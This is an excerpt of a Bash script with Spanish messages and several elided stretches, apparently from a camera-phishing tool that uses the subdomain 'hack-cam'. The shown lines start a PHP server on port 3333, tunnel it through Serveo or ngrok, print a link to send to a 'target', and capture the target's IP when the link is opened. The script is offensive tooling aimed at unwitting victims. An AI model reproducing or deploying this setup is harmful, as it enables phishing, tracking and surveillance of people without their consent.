...
printf "\033[1;31m ¡Target abrió el enlace!\n"
catch_ip
rm -rf ip.txt
...
printf "\033[1;31m Iniciando Serveo ...\n"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
...
printf "\033[1;31m Iniciando servidor php ...\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
printf "\033[1;31m Enlace directo:\n"
}
...
printf "\033[1;31m Descargando Ngrok ...\n"
...
printf "\033[1;31m Iniciando servidor ngrok ...\n "
...
echo ""
printf "\033[1;31m Elija una opción de reenvío de puertos:\n"
...
default_subdomain="hack-cam$RANDOM"
